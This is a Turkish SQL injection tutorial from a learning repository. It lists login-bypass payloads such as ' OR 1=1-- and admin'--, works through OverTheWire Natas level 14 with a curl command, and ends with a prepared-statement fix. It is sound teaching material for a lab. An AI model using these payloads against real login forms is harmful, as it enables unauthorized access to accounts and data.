# 🌐 Web Güvenliği — SQL Injection (SQLi) — Temel

> Uygulama şunu yapıyor: kullanıcı adını al, SQL sorgusuna ekle, çalıştır.
> Sen de SQL sorgusunun bir parçası olmayı reddedip kendi sorgunla konuşabilirsin.

---

## 📋 İçindekiler

- [SQL Nedir?](#sql-nedir)
- [SQL Injection Nedir?](#sql-injection-nedir)
- [Temel Payloadlar](#temel-payloadlar)
- [Yorum Karakterleri](#yorum-karakterleri)
- [Authentication Bypass](#authentication-bypass)
- [Hata Mesajlarını Okumak](#hata-mesajlarını-okumak)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## SQL Nedir?

**SQL (Structured Query Language)**, veritabanlarıyla konuşmak için kullanılan dildir. Web uygulamaları kullanıcı verilerini almak, doğrulamak ve kaydetmek için SQL sorguları çalıştırır.

### Temel SQL Sorguları

```sql
-- Tüm kullanıcıları getir
SELECT * FROM users;

-- Belirli bir kullanıcıyı getir
SELECT * FROM users WHERE username = 'admin';

-- Kullanıcı adı VE şifre eşleşmeli
SELECT * FROM users WHERE username = 'admin' AND password = '1234';

-- Tabloya kayıt ekle
INSERT INTO users (username, password) VALUES ('yeni', 'sifre');
```

### WHERE Koşulları

```sql
WHERE username = 'admin'         -- eşit
WHERE id > 5                     -- büyük
WHERE username LIKE '%admin%'    -- içeriyor
WHERE username = 'a' OR 1=1     -- OR koşulu
WHERE username = 'a' AND 1=2    -- AND koşulu
```

---

## SQL Injection Nedir?

Uygulama kullanıcı girdisini doğrulamadan SQL sorgusuna eklediğinde ortaya çıkar.

```php
// Tehlikeli kod:
$user = $_POST['username'];
$pass = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
```

Kullanıcı `admin` ve `1234` girerse:

```sql
SELECT * FROM users WHERE username='admin' AND password='1234'
```

Normal. Ama kullanıcı `admin'--` girerse:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='...'
                                          ^^
                                     yorum başladı, password koşulu devre dışı
```

---

## Temel Payloadlar

### Tırnak Testi

Her zaman önce tek tırnak ile başla — hata mesajı gelirse SQLi var demektir.

```
'                → Tek tırnak — syntax error bekliyoruz
''               → Çift tek tırnak — kaçış
"                → Çift tırnak
```

```sql
-- Girdi: '
SELECT * FROM users WHERE username=''' AND password='...'
--                                  ↑ syntax error!
```

MySQL hata mesajı: `You have an error in your SQL syntax...`

### Mantıksal Testler

```
' OR '1'='1     → Her zaman true
' OR 1=1 --     → Her zaman true, geri kalanı yorum
' OR 'a'='a     → Her zaman true
```

---

## Yorum Karakterleri

SQL'de yorumlar sorgunun geri kalanını devre dışı bırakır.

| Veritabanı | Yorum Karakteri |
|------------|-----------------|
| MySQL | `--` (ve ardından boşluk: `-- `) veya `#` |
| PostgreSQL | `--` |
| MSSQL | `--` veya `/* */` |
| SQLite | `--` |
| Oracle | `--` |

```sql
-- MySQL'de # yorum başlatır
SELECT * FROM users WHERE username='admin'#' AND password='...'

-- -- yorum başlatır (sondaki boşluğa dikkat)
SELECT * FROM users WHERE username='admin'-- ' AND password='...'
```

> ⚠️ MySQL'de `--` yorumunun çalışması için arkasında **boşluk** olması gerekir. URL'de `--+` veya `-- -` kullanılır (+ = boşluk URL encoding'de).

---

## Authentication Bypass

Login formlarında kullanılan en yaygın SQL Injection tekniği.

### Senaryo

```php
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
// Eğer sorgu sonuç dönerse → giriş başarılı
```

### Bypass 1: Sadece username ile

```
Username: admin'--
Password: [boş veya herhangi bir şey]
```

```sql
SELECT * FROM users WHERE username='admin'-- ' AND password='...'
-- password koşulu yok → admin'in şifresini bilmeden giriş
```

### Bypass 2: OR ile her zaman true

```
Username: ' OR 1=1-- 
Password: [boş]
```

```sql
SELECT * FROM users WHERE username='' OR 1=1-- ' AND password='...'
-- 1=1 her zaman true → ilk kullanıcı (genellikle admin) döner
```

### Bypass 3: Her iki alanda

```
Username: ' OR '1'='1
Password: ' OR '1'='1
```

```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
```

### Bypass 4: Yorum olmadan (tırnakları kapatarak)

```
Username: admin
Password: ' OR '1'='1
```

```sql
SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'
```

---

## Hata Mesajlarını Okumak

MySQL hata mesajları çok bilgi verir:

```
You have an error in your SQL syntax; check the manual that corresponds to 
your MySQL server version for the right syntax to use near ''...' at line 1
```

Bu mesaj → SQLi var, MySQL kullanıyor, tırnak sayısını ayarlamamız gerekiyor.

```
Warning: mysql_fetch_array() expects parameter 1 to be resource, 
boolean given in /var/www/html/index.php on line 42
```

Bu mesaj → Sorgu false döndürdü (boş sonuç veya hata).

---

## Natas'ta Kullanım

### Natas 14 — Temel Authentication Bypass

**Kaynak kod:**

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);

    $query = "SELECT * from users where username=\""
             . $_REQUEST["username"]
             . "\" and password=\""
             . $_REQUEST["password"]
             . "\"";

    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
        echo "Successful login! The password for natas15 is <censored>";
    } else {
        echo "Access denied!";
    }
    mysql_close($link);
}
?>
```

**Analiz:**

- Çift tırnak `"` kullanılıyor (`username=\"...\"`)
- `debug` parametresi varsa sorguyu ekrana yazıyor — debug modu aktif et!
- Sonuç 0'dan fazla satır dönerse → giriş başarılı

**Adım 1 — Debug modunu aktif et:**

```
URL: http://natas14.natas.labs.overthewire.org/?debug
```

Şimdi hangi sorgunun çalıştığını göreceksin.

**Adım 2 — Payload:**

```
Username: " OR 1=1--
Password: [boş]
```

Oluşan sorgu:

```sql
SELECT * from users where username="" OR 1=1-- " and password=""
```

`OR 1=1` her zaman true → en az bir satır döner → giriş başarılı.

**curl ile:**

```bash
curl -u natas14:[şifre] \
     'http://natas14.natas.labs.overthewire.org/?debug' \
     --data 'username=" OR 1=1--+&password='
```

**Alternatif payloadlar:**

```
Username: " OR "1"="1
Username: " OR 1=1#
Username: admin"--
```

---

### SQL Injection — Kontrol Listesi

```
Zafiyeti tespit et:
  ☐ Tek tırnak ' gönder → SQL syntax hatası mı geldi?
  ☐ Debug parametresi var mı? (?debug, ?show_query)
  ☐ Hata mesajında "SQL", "mysql", "syntax" geçiyor mu?

Bypass dene:
  ☐ ' OR 1=1--     (tek tırnak + yorum)
  ☐ " OR 1=1--     (çift tırnak + yorum)
  ☐ ' OR 1=1#      (MySQL # yorum)
  ☐ ' OR '1'='1    (tırnakları kapat)
  ☐ admin'--        (belirli kullanıcı, password bypass)

Tırnak türünü belirle:
  ☐ Hata mesajına bak — '' mi " " mi?
  ☐ Kaynak kodu varsa SQL sorgusunu bul
```

---

### Güvenli Kod — Prepared Statements

```php
// KÖTÜ — string concatenation
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";

// İYİ — prepared statement (parametreli sorgu)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$user, $pass]);
$result = $stmt->fetchAll();
```

Prepared statement'ta kullanıcı girdisi **asla** SQL kodu olarak yorumlanmaz. `'` veya `"` gibi karakterler otomatik escape edilir.

---

## 🔗 Kaynaklar

- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

**Önceki konu:** [10_dosya_yukleme_bypass.md](./10_dosya_yukleme_bypass.md)
**Sonraki konu:** [12_blind_sql_injection.md](./12_blind_sql_injection.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
